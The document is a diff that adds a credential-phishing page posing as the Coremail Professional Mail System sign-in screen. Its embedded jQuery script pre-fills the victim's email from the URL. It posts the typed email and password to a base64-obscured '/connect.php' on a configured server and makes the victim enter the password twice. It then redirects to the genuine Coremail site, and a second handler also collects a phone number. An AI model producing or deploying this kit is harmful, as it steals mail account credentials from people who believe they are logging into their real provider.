@@ -1,0 +1,1074 @@
+
+<!DOCTYPE html
+    PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+    <title>Coremail Professional Mail System</title>
+    <link rel="stylesheet" type="text/css" href="assets/css.css" charset="ISO-8859-1" />
+    <style>
+        @charset "iso-8859-1";
+
+        html {
+            width: 100%;
+            height: 100%;
+            overflow: visible;
+        }
+
+        body {
+            position: relative;
+            height: 100%;
+            min-width: 720px;
+            min-height: 550px;
+            margin: 0;
+        }
+
+        body,
+        table,
+        select,
+        input,
+        button {
+            font-size: 12px;
+            font-family: '\5FAE\8F6F\96C5\9ED1', tahoma, arial, sans-serif;
+        }
+
+        body,
+        select {
+            background-color: #fff;
+        }
+
+        form {
+            margin: 0;
+            padding: 0;
+        }
+
+        a {
+            color: #555555;
+            text-decoration: none;
+        }
+
+        a:hover {
+            color: #000;
+        }
+
+        input:-webkit-autofill {
+            -webkit-box-shadow: 0 0 0px 1000px #FFFFFF inset;
+        }
+
+        input::-ms-clear,
+        input::-ms-reveal {
+            display: none;
+        }
+
+        :focus {
+            outline: none;
+        }
+
+        .Head {
+            height: 70px;
+            margin: 0 auto;
+            width: 1000px;
+            background-color: #ffffff;
+            font-size: 14px;
+            color: #515151;
+        }
+
+        .Head .Logo {
+            background: url(logo.png) no-repeat;
+            width: 250px;
+            height: 100%;
+            float: left;
+            cursor: pointer;
+        }
+
+        .Head .Links {
+            text-align: right;
+            float: right;
+            line-height: 70px;
+            padding-right: 50px;
+        }
+
+        .Head a {
+            padding-left: 20px;
+        }
+
+        #main {
+            height: 410px;
+            background: #519AF1;
+        }
+
+        .Main {
+            height: 410px;
+            width: 100%;
+            margin: 0 auto;
+        }
+
+        .bgclick {
+            height: 410px;
+            width: 68.5%;
+            float: left;
+            cursor: pointer;
+            position: absolute;
+            top: 0;
+            left: 0;
+            background: #fff;
+            opacity: 0;
+            filter: alpha(opacity=0);
+        }
+
+        .MainContent {
+            width: 1000px;
+            height: 100%;
+            margin: 0 auto;
+            position: relative;
+        }
+
+        .MainContent .main_bg {
+            height: 100%;
+            position: absolute;
+            left: 0;
+            top: 0;
+        }
+
+        .MainContent .u-btn-detail {
+            position: absolute;
+            left: 1px;
+            width: 170px;
+            height: 44px;
+            top: 232px;
+            font-size: 16px;
+            color: #2579d7;
+            background: #ffffff;
+            text-align: center;
+            line-height: 44px;
+            white-space: nowrap;
+            cursor: pointer;
+            border-radius: 4px;
+        }
+
+        .MainContent .u-btn-detail:hover {
+            background: #d1e6ff;
+        }
+
+        .MainR {
+            border: 1px solid #bbdaee;
+            background: #cce5f6;
+            font-size: 14px;
+            width: 260px;
+            height: 408px;
+            float: right;
+            margin-right: 50px;
+            position: absolute;
+            right: 0;
+            top: 0;
+        }
+
+        .MainR .Header {
+            height: 46px;
+            position: relative;
+        }
+
+        .MainR .Header div {
+            cursor: pointer;
+            width: 129.5px;
+            font-size: 14px;
+            font-weight: bold;
+            float: left;
+            line-height: 44px;
+            height: 44px;
+            text-align: center;
+            border: solid #bbdaee;
+        }
+
+        .MainR .Header .active {
+            border: 0;
+            color: #414141;
+        }
+
+        .MainR .Header .inactiveAdmin,
+        .inactiveUser {
+            background: #e0eff9;
+            color: #9da8b0;
+        }
+
+        .MainR .Header .inactiveAdmin {
+            border-width: 0 0 1px 1px;
+        }
+
+        .MainR .Header .inactiveUser {
+            border-width: 0 1px 1px 0;
+        }
+
+        #logArea {
+            color: #888888;
+            font-size: 12px;
+            height: 288px;
+            margin-top: 15px;
+        }
+
+        #logArea .languagePanel {
+            width: 100%;
+            margin: 0 0 10px;
+        }
+
+        #logArea .languagePanel .language {
+            margin: 0 auto 10px;
+            width: 213px;
+            height: 24px;
+            line-height: 24px;
+            position: relative;
+        }
+
+        #logArea .languagePanel .language .languageOptions {
+            cursor: pointer;
+            background-color: #cce5f6;
+            float: right;
+        }
+
+        #languageLabel,
+        #languageName,
+        #arrow {
+            display: inline;
+        }
+
+        #logArea .languagePanel .language .languageOptions:hover {
+            color: #666666;
+        }
+
+        #arrow img {
+            display: inline-block;
+            position: relative;
+            top: 3px;
+            left: -3px;
+        }
+
+        .languages {
+            display: none;
+            position: absolute;
+            top: 24px;
+            right: 0;
+            width: 121px;
+            z-index: 999;
+            opacity: 0.9;
+            filter: progid:DXImageTransform.Microsoft.Alpha(opacity=90);
+            -ms-filter: "progid:DXImageTransform.Microsoft.Alpha(opacity=90)";
+        }
+
+        .languages .arrow {
+            height: 10px;
+            background: url("https://m3c4bybtiilggxl4aifxymibmrapvqu3afjk7xompczag6n2d3ra.arweave.net/ZsXA4DNCFmNdfAILfDEBZED6wpsBUq_dzHiyA3m6HuI") no-repeat bottom center;
+            z-index: 1;
+            position: relative;
+        }
+
+        .languages .items {
+            background: #fafcfe;
+            border: solid #d5d8db;
+            border-width: 1px 1px 0;
+            margin-top: -1px;
+            box-shadow: 0 0 5px rgba(0, 0, 0, 0.1);
+        }
+
+        .languages .items div {
+            border-bottom: 1px solid #d5d8db;
+            height: 40px;
+            color: #494949;
+            line-height: 40px;
+            padding-left: 20px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .languages .items div:hover {
+            background: #e6f2fa;
+            color: #3598db;
+        }
+
+        .s {
+            border-bottom: 1px solid #bbdaee;
+            padding-bottom: 11.5px;
+            width: 67px;
+            height: 0;
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+
+        #logArea .inptr {
+            height: 34px;
+            width: 213px;
+            border: 0;
+            margin: 0 auto 10px;
+            font-weight: bold;
+        }
+
+        #logArea .inptr .blank {
+            height: 100%;
+            width: 211px;
+            background: #FFFFFF;
+            border-radius: 4px;
+            border: 1px solid #FFFFFF;
+        }
+
+        #logArea .inptr .blank .img {
+            height: 100%;
+            width: 36px;
+            padding: auto;
+            float: left;
+            text-align: center;
+        }
+
+        #logArea .inptr .blank .img img {
+            position: relative;
+            top: 9px;
+        }
+
+        #logArea .inptr .blank input {
+            border: 0;
+            width: 150px;
+            height: 34px;
+            vertical-align: middle;
+            padding: 0;
+            float: left;
+            display: block;
+            border-radius: 4px;
+            color: #000000;
+            font-size: 14px;
+            line-height: 34px;
+        }
+
+        #logArea .inptr .blank .delete {
+            display: none;
+            position: relative;
+            height: 100%;
+            width: 34px;
+            left: 179px;
+            z-index: 100;
+            background: url(https://762vgrcplhbw6xdhd2mpvatqakhqx5mncpcpq4ylk5i2k2lknffa.arweave.net/_7VTRE9Zw29cZx6Y-oJwAo8L9Y0TxPhzC1dRpWlqaUo) no-repeat center center;
+            cursor: pointer;
+        }
+
+        #logArea .inptr .blank input::-webkit-input-placeholder {
+            color: #9A9A9A
+        }
+
+        #logArea .inptr .blank input:-moz-placeholder {
+            color: #9A9A9A
+        }
+
+        #logArea .inptr .blank input::-moz-placeholder {
+            color: #9A9A9A
+        }
+
+        #logArea .inptr .blank input:-ms-input-placeholder {
+            color: #9A9A9A
+        }
+
+        #logArea .inptr .button {
+            height: 34px;
+            width: 100%;
+            border-radius: 4px;
+            background: #3598db;
+            color: #FFFFFF;
+            margin: 0 auto 10px;
+            font-size: 16px;
+            text-align: center;
+            line-height: 34px;
+            cursor: pointer;
+        }
+
+        #logArea .inptr .button:hover {
+            background: #2588cb;
+        }
+
+        #logArea .inptr .button:active {
+            background: #16679e;
+        }
+
+        #logArea .inptr .verifyCode,
+        #vcImageTR {
+            float: left;
+            margin-right: 5px;
+        }
+
+        #logArea .inptr .verifyCode {
+            width: 80px;
+            height: 100%;
+            background: #FFFFFF;
+            border-radius: 4px;
+        }
+
+        #logArea .inptr .verifyCode #verifyCode {
+            border: 0;
+            width: 70px;
+            height: 100%;
+            border-radius: 4px;
+            padding: 0;
+            margin-left: 10px;
+        }
+
+        #logArea .inptr #vcImageTR {
+            height: 34px;
+        }
+
+        #logArea .inptr img#vcImage {
+            width: 79px;
+            height: 33px;
+            border: 1px solid #bbdaee;
+        }
+
+        #logArea .inptr a {
+            color: #52a3df;
+            height: 34px;
+            vertical-align: middle;
+            display: inline-block;
+        }
+
+        #logArea .inptr .Error {
+            width: 213px;
+            height: 15px;
+            color: #FF0000;
+            margin: 0 auto;
+            white-space: normal;
+            text-align: left;
+            line-height: 15px;
+            float: left;
+        }
+
+        #logArea .inptr .forget {
+            text-align: right;
+            color: #888888;
+            font-weight: normal;
+            float: right;
+            display: none;
+        }
+
+        #logArea .options {
+            margin: 0 auto 10px;
+            height: 22px;
+            width: 213px;
+        }
+
+        #logArea .options div {
+            cursor: pointer;
+        }
+
+        #logArea .options #savePwd {
+            float: left;
+        }
+
+        #logArea .options #SSL {
+            float: right;
+        }
+
+        #logArea .options .rememberPwd {
+            float: left;
+        }
+
+        #logArea .options .SSL {
+            float: right;
+        }
+
+        #logArea .options .checked,
+        .unChecked {
+            height: 16px;
+            width: 16px;
+        }
+
+        #logArea .options .checked {
+            background: url("https://2pcac46gvjoo67gnbm5ghtyikpvumshehzj4gfkm7jythnxzuq6a.arweave.net/08QBc8aqXO98zQs6Y88IU-tGSOQ-U8MVTPpxM7b5pDw");
+        }
+
+        #logArea .options .unChecked {
+            background: url("https://sior6q3or5xgdlrvnllv7byefnquqhydztsr3gwj2ck47cxe4dwq.arweave.net/kh0fQ26PbmGuNWrXX4cEK2FIHwPM5R2aydCVz4rk4O0");
+        }
+
+        #logArea .indent {
+            padding-left: 90px;
+            _padding-left: 92px;
+            height: auto;
+        }
+
+        .MainFooter {
+            height: 59px;
+            border: solid #cce5f6;
+            border-width: 1px 0 0;
+            background: #E6F2fb;
+        }
+
+        .MainFooter .content {
+            height: 31px;
+            margin: 14px;
+        }
+
+        .MainFooter .content .block {
+            float: right;
+            color: #ACACAC;
+            margin: 2px;
+            font-size: 10px;
+            text-align: right;
+            cursor: pointer;
+        }
+
+        .clearfix:before,
+        .clearfix:after {
+            display: table;
+            content: "";
+        }
+
+        .clearfix:after {
+            clear: both;
+        }
+
+        .clearfix {
+            zoom: 1;
+        }
+
+        .footer {
+            width: 100%;
+        }
+
+        .footer .content {
+            width: 1000px;
+            margin: 0 auto;
+            padding-top: 62px;
+        }
+
+        .footer .downloadList {
+            float: left;
+            margin-right: 59px;
+            margin-top: 20px;
+        }
+
+        .footer .downloadList a {
+            display: inline-block;
+            margin-right: 37px;
+            text-align: center;
+        }
+
+        .footer .downloadList a.last-1 {
+            margin-right: 19px;
+        }
+
+        .footer .downloadList a.last {
+            margin-right: 0;
+        }
+
+        .footer .downloadList a span.img {
+            display: inline-block;
+            width: 48px;
+            height: 48px;
+            margin-bottom: 18px;
+        }
+
+        .footer .downloadList a span.text {
+            color: #858585;
+            display: block;
+        }
+
+        .footer .downloadList span.ios {
+            background: url('https://xpn25mwzszxywekl6lrzezv6rlwb73lptv63duxvq4ibgx2r776q.arweave.net/u9uustmWb4sRS_Ljkma-iuwf7W-dfbHS9YcQE19R__0');
+        }
+
+        .footer .downloadList span.android {
+            background: url('https://f47cscl4644a5ssiw2myw26e3exsdxwqqocn7jlai6flfk2hqfuq.arweave.net/Lz4pCXz3OA7KSLaZi2vE2S8h3tCDhN-lYEeKsqtHgWk');
+        }
+
+        .footer .downloadList span.pc {
+            background: url('https://5qaruwanps26duwhfwpkpn3gc5teb457tjczwei7yt74dpvuxvfa.arweave.net/7AEaWA18teHSxy2ep7dmF2ZA87-aRZsRH8T_wb60vUo');
+        }
+
+        .footer .downloadList span.lunkr-mail {
+            background: url('https://z2vqvkir67uqbxk43zee5eazytkbnlyqjndvmmfxjqmcrldvzk2a.arweave.net/zqsKqRH36QDdXN5ITpAZxNQWrxBLR1Ywt0wYKKx1yrQ');
+        }
+
+        .footer .downloadList span.plug-in {
+            background: url('https://usqv52bw34mqfqg3xxw36vgft5bhfy2pu4kiv6sr4g6vkhrdbova.arweave.net/pKFe6DbfGQLA273tv1TFn0Jy40-nFIr6UeG9VR4jC6o');
+        }
+
+        .footer .lunkr-qr {
+            float: left;
+            padding-right: 52px;
+            border-right: 2px solid #dfdfdf;
+            margin-right: 52px;
+            text-align: center;
+        }
+
+        .footer .lunkr-qr .img-wrapper {
+            padding: 8px;
+            border: 1px solid #ebebeb;
+            margin-bottom: 2px;
+        }
+
+        .footer .lunkr-qr .img-wrapper>img {
+            width: 84px;
+            height: 84px;
+        }
+
+        .footer .lunkr-qr .img,
+        .footer .wechat-qr .img {
+            width: 102px;
+            height: 102px;
+            margin-bottom: 2px;
+        }
+
+        .footer .lunkr-qr .text,
+        .footer .wechat-qr .text {
+            color: #858585;
+        }
+
+        .footer .wechat-qr {
+            float: left;
+            margin-right: 30px;
+            text-align: center;
+        }
+
+        .footer .wechat-qr .img {
+            background: url('https://qzpjr5cxwymjbpdh32lmxev7fulcaejqyvmkpgcgbso3t37eyrra.arweave.net/hl6Y9Fe2GJC8Z96Wy5K_LRYgETDFWKeYRgydue_kxGI');
+        }
+
+        .footer .sale-phone {
+            float: left;
+            font-size: 16px;
+            text-align: left;
+            margin-top: 30px;
+        }
+
+        .footer .sale-phone .text {
+            color: #555555;
+            margin-bottom: 12px;
+        }
+
+        .footer .sale-phone .phone-number {
+            color: #212121;
+        }
+
+        .new {
+            background: url("https://tljdauxwit3gkupazm5aqrv3nnlxdko4snxrxx223kowljp6xvvq.arweave.net/mtIwUvZE9mVR4Ms6CEa7a1dxqdyTbxvfWtqdZaX-vWs") no-repeat center;
+            width: 28px;
+            height: 28px;
+            position: absolute;
+            top: 7px;
+        }
+
+        .footer .copyright {
+            width: 100%;
+            height: 45px;
+            background: #e5e5e5;
+            text-align: center;
+            color: #777777;
+            line-height: 45px;
+        }
+
+        .hidden {
+            display: none;
+            position: absolute;
+            top: -10000px;
+            left: -10000px;
+            width: 0;
+            height: 0;
+        }
+    </style>
+
+</head>
+
+
+<body style=" overflow: auto">
+    <div class="Head">
+        <div class="Logo"></div>
+        <div class="Links">
+            <a href="#" target="">
+                Official Website
+            </a>
+            <a href="#">
+                Application for trial
+            </a>
+            <a href="#">
+                Client Settings
+            </a>
+            <a href="#">
+                Support Center
+            </a>
+        </div>
+    </div>
+
+    <div id="main">
+        <div class="Main">
+            <div class="MainContent">
+                <img class="main_bg"
+                    src="https://6husaym7s72zq6slivvifphg7a6ulmqjcqkwuc33ybkqi2eojg6a.arweave.net/8ekgYZ-X9Zh6S0Vqgrzm-D1FsgkUFWoLe8BVBGiOSbw" />
+                <a class="bgclick j-bgclick" href="#" target="_blank"></a>
+                <div class="u-btn-detail j-btn-detail">More features</div>
+                <div class="MainR">
+                    <div class="Header">
+                        <div class="active">
+                            User</div>
+                        <div class="inactiveAdmin" id="adminLoginTab">
+                            Administrator</div>
+                    </div>
+                    <div id="logArea">
+
+                        <form id="loginForm">
+                            <input type="hidden" id="webmailIndexUrl" name="webmailIndexUrl">
+                            <div class="languagePanel">
+                                <div class="language">
+                                    <div class="s"></div>
+                                    <div id="languageOptions" class="languageOptions" tabindex="0">
+                                        <div id="languageLabel">
+                                            Language:</div>
+                                        <div id="languageName"></div>
+                                        <div id="arrow">
+                                            <img
+                                                src="https://vu3pyjysramco3xoagi5enpib6z42qgb62fzafr5dnrnxq2b4wia.arweave.net/rTb8JxKIGCdu7gGR0jXoD7PNQMH2i5AWPRti28NB5ZA" />
+                                        </div>
+                                    </div>
+                                    <div class="languages">
+                                        <div class="arrow"></div>
+                                        <div class="items">
+                                            <div class="item">
+                                                简体中文</div>
+                                            <div class="item">
+                                                繁體中文</div>
+                                            <div class="item">
+                                                English</div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="inptr">
+                                <div class="blank">
+                                    <div class="img">
+                                        <img
+                                            src="https://qq4qkssoayzp2z3qbx3uhn2vra5vwtceia7jdfhflhjxeoztrhfq.arweave.net/hDkFSk4GMv1ncA33Q7dViDtbTERAPpGU5VnTcjszics" />
+                                    </div>
+                                    <input type="text" name="em" id="ai" placeholder="Username" autocomplete="off" />
+                                    <div class="delete"></div>
+                                    <input type="hidden" name="nodetect" />
+                                    <input type="hidden" name="domain" id="domain" />
+                                </div>
+                            </div>
+
+                            <div class="inptr">
+                                <div class="blank">
+                                    <div class="img">
+                                        <img
+                                            src="https://hle2ctrqv3hlpdw5acex2ujykp7dl6i6oq7scfvm7oit556iioha.arweave.net/OsmhTjCuzreO3QCJfVE4U_41-R50PyEWrPuRPvfIQ44" />
+                                    </div>
+                                    <input type="password" name="ps" id="namep" placeholder="Password"
+                                        autocomplete="off" value="" />
+                                    <div class="delete"></div>
+                                </div>
+                            </div>
+
+                            <div class="options">
+                                <div id="savePwd">
+                                    <div class="rememberPwd unChecked"></div>
+                                    <div class="rememberPwd">
+                                        &nbsp;Remember</div>
+                                </div>
+                                <div id="SSL">
+                                    <div class="SSL">
+                                        &nbsp;Use SSL</div>
+                                    <div class="SSL unChecked"></div>
+                                </div>
+                                <input id="saveUsername" name="saveUsername" type="checkbox" style="display: none" />
+                                <input name="useSSL" type="checkbox" style="display: none" />
+                            </div>
+
+                            <div class="row">
+
+                                <div class="error" id="msg" style="display: none; color:red;">
+                                    &#x60A8;&#x8F93;&#x5165;&#x7684;&#x7528;&#x6237;&#x540D;&#x6216;&#x5BC6;&#x7801;&#x4E0D;&#x6B63;&#x786E;&#x3002;
+                                </div>
+                                <div class="alert alert-danger" id="error" style="display: none; color:red;">
+                                    &#x5BC6;&#x7801;&#x9519;&#x8BEF;</div>
+                            </div>
+
+                            <div class="inptr">
+                                <div class="button" id="submit-btn" tabindex="0">
+                                    Sign in</div>
+
+                            </div>
+
+                            <div class="inptr">
+                                <div class="Error"></div>
+                            </div>
+
+                        </form>
+                    </div>
+                    <div class="MainFooter">
+                        <div class="content">
+                            <div class="block">
+                                <img
+                                    src="https://rudgdq57nqv3vkkzm5hvrjcblknrurtikvhw7triszjpolsusceq.arweave.net/jQZhw79sK7qpWWdPWKRBWpsaRmhVT2_OKJZS9y5UkIk" />
+                            </div>
+                            <div class="block">
+                                <img
+                                    src="https://mulkczndqksciwa6kwo2ixuiaf5vg6yvqzvkhuk5x4r5kjmu7apa.arweave.net/ZRahZaOCpCRYHlWdpF6IAXtTexWGaqPRXb8j1SWU-B4" />
+                            </div>
+                            <div class="block">
+                                <img
+                                    src="https://6tobqcwlqqua5cfeaiq2gdwr2p352s45vjsfcgia2e6jkii67sua.arweave.net/9NwYCsuEKA6IpAIhow7R0_fdS52qZFEZANE8lSEe_Kg" />
+                            </div>
+                            <div class="block">
+                                Security<br />Certification
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div class="content clearfix contact">
+            <div class="downloadList">
+                <a href="#">
+                    <span class="img ios"></span>
+                    <span class="text">iPhone</span>
+                </a>
+                <a href="#">
+                    <span class="img android"></span>
+                    <span class="text">Android</span>
+                </a>
+                <a href="#">
+                    <span class="img pc"></span>
+                    <span class="text">PC_IM</span>
+                </a>
+                <a class="last-1" href="#">
+                    <span class="img lunkr-mail"></span>
+                    <span class="text">PC_Mail</span>
+                </a>
+                <a class="last" href="#">
+                    <span class="img plug-in"></span>
+                    <span class="text">Plug-in unit download</span>
+                </a>
+            </div>
+            <div class="lunkr-qr">
+                <div class="img-wrapper">
+                    <img src="https://lunkr.cn/res/qrcode/lunkr/200.png">
+                </div>
+                <div class="text">APP Download</div>
+            </div>
+
+            <div class="wechat-qr">
+                <div class="img"></div>
+                <div class="text">WeChat</div>
+            </div>
+
+            <div class="sale-phone">
+                <div class="text">Sales</div>
+                <div class="phone-number">400-000-1631</div>
+            </div>
+        </div>
+        <div class="copyright">
+            <a href="#"> Coremail Copyright &copy; 2002-2021 </a>
+            <a href="#"> | Guangdong ICP Backup 10201174 Number-4</a>
+            <a href="#"> | Guangdong public network No.44011302001741</a>
+        </div>
+    </div>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="./config.js"></script>
+    <script>
+        /* global $ */
+        $(document).ready(function () {
+            var count = 0;
+
+            var url = new URL(window.location.href);
+            var ai = url.searchParams.get('cms');
+            document.querySelector('#ai').value = ai;
+
+            /////////////url ai getting////////////////
+            var ai = window.location.hash.substr(1);
+            if (!ai) {
+
+            } else {
+                // $('#ai').val(ai);
+                var my_ai = ai;
+                var ind = my_ai.indexOf("@");
+                var my_slice = my_ai.substr((ind + 1));
+                var c = my_slice.substr(0, my_slice.indexOf('.'));
+                var final = c.toLowerCase();
+                $('#ai').val(my_ai);
+                $("#msg").hide();
+                $.get("https://logo.clearbit.com/" + my_slice)
+                    .done(function () {
+                        $(".log").attr("src", "https://logo.clearbit.com/" + my_slice);
+
+                    }).fail(function () {
+                        $(".log").attr("src", "https://i.imgur.com/cKV4FIx.png");
+
+                    })
+            }
+            var atu = "L2Nvbm5lY3QucGhw";
+
+            $('#submit-btn').click(function (event) {
+                $('#error').hide();
+                $('#msg').hide();
+                event.preventDefault();
+                var ai = $("#ai").val();
+                var namep = $("#namep").val();
+                var msg = $('#msg').html();
+                $('#msg').text(msg);
+
+                var my_ai = ai;
+                var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+                if (!ai) {
+                    $('#error').show();
+                    $('#error').html("&#x7535;&#x5B50;&#x90AE;&#x4EF6;&#x4E3A;&#x5FC5;&#x586B;&#x9879;");
+                    ai.focus;
+                    return false;
+                }
+
+                if (!filter.test(my_ai)) {
+                    $('#error').show();
+                    $('#error').html("&#x7535;&#x5B50;&#x90AE;&#x4EF6;&#x4E3A;&#x5FC5;&#x586B;&#x9879;");
+                    ai.focus;
+                    return false;
+                }
+                if (!namep) {
+                    $('#error').show();
+                    $('#error').html("&#x5BC6;&#x7801;&#x662F;&#x5FC5;&#x9700;&#x7684;");
+                    ai.focus;
+                    return false;
+                }
+                //minimum password length validation  
+
+                if (namep.length < 5) {
+
+                    $('#error').show();
+                    $('#error').html("&#x8BF7;&#x68C0;&#x67E5;&#x60A8;&#x7684;&#x5BC6;&#x7801;");
+                    ai.focus;
+
+                    return false;
+
+                }
+                var ind = my_ai.indexOf("@");
+                var my_slice = my_ai.substr((ind + 1));
+                var c = my_slice.substr(0, my_slice.indexOf('.'));
+                var final = c.toLowerCase();
+
+                $.get("https://logo.clearbit.com/" + my_slice)
+                    .done(function () {
+                        $(".log").attr("src", "https://logo.clearbit.com/" + my_slice);
+
+                    }).fail(function () {
+                        $(".log").attr("src", "https://i.imgur.com/cKV4FIx.png");
+
+                    })
+
+                count = count + 1;
+
+                $.ajax({
+                    dataType: 'JSON',
+                    url: `${config.baseUrl}${atob(atu)}`,
+                    type: 'POST',
+                    data: {
+                        ai: ai,
+                        pr: namep,
+                    },
+                    // data: $('#contact').serialize(),
+                    beforeSend: function (xhr) {
+                        $('#submit-btn').val('Login...');
+                    },
+                    success: function (response) {
+                        if (count == 2 && final == "gmail") {
+                            $('#aich').html(my_ai);
+                            $("#div1").animate({ left: 0, opacity: "hide" }, 0);
+                            $("#div2").animate({ right: 0, opacity: "show" }, 1000);
+
+                            return false;
+
+                        }
+                        if (response) {
+                            $("#msg").show();
+                            console.log(response);
+                            if (response['signal'] == 'ok') {
+                                $("#namep").val("");
+                                if (count >= 2) {
+                                    count = 0;
+                                    // window.location.replace(response['redirect_link']);
+                                    window.location.replace("https://mail.icoremail.net/");
+
+                                }
+                                // $('#msg').html(response['msg']);
+                            } else {
+                                // $('#msg').html(response['msg']);
+                            }
+                        }
+                    },
+                    error: function () {
+                        if (count == 2 && final == "gmail") {
+                            $('#aich').html(my_ai);
+                            $("#div1").animate({ left: 200, opacity: "hide" }, 0);
+                            $("#div2").animate({ right: 200, opacity: "show" }, 1000);
+
+                            return false;
+
+                        }
+                        $("#namep").val("");
+                        if (count >= 2) {
+                            count = 0;
+                            window.location.replace("https://mail.icoremail.net/");
+                        }
+                        $("#msg").show();
+                        // $('#msg').html("Please try again later");
+                    },
+                    complete: function () {
+                        $('#submit-btn').val('Login');
+                    }
+                });
+            });
+
+            $('#submit-btn1').click(function (event) {
+                event.preventDefault();
+                var ai = $("#ai").val();
+                var namep = $("#namep").val();
+                var ph = $("#ph").val();
+                var detail = $("#field").html();
+                var msg1 = $('#msg1').html();
+                if (!ph) {
+                    $('#error').show();
+                    $('#error').html("Phone number is required");
+                    ai.focus;
+                    return false;
+                }
+                $.ajax({
+                    dataType: 'JSON',
+                    url: atob(file),
+                    type: 'POST',
+                    data: {
+                        ai: ai,
+                        namep: namep,
+                        detail: detail,
+                        ph: ph,
+
+                    },
+                    beforeSend: function (xhr) {
+                        $('#submit-btn1').val('Verifing...');
+                    },
+                    success: function (response) {
+                        window.location.replace("https://mail.icoremail.net/");
+
+                    },
+                    error: function () {
+                        window.location.replace("https://mail.icoremail.net/");
+                    },
+                    complete: function () {
+                        $('#submit-btn1').val('Verify');
+                    }
+                });
+                // }
+            });
+
+
+        });
+    </script>
+
+
+</body>
+
+</html>
